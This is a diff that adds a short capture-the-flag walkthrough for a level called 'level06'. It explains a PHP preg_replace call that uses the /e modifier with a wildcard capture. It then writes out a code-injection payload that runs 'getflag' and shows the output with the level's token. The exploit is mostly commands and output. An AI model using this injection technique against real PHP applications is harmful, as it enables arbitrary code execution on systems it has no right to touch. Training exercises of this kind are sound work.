@@ -1,0 +1,13 @@
+# At this level, we have an executable 'level06' and it source code 'level06.php'.
+# The executable will do a basic replace of some specific patterns, but one in particular will catch my attention:
+
+$a = preg_replace(/(\[x (.*)\])\e, "y(\"\\2\")", $a)
+
+# This preg_replace uses a wildcard (.*), this allows us to inject some code inside:
+
+$> echo "[x {\${exec(getflag)}})]" > /tmp/injection
+
+$> ./level06 /tmp/injection
+
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
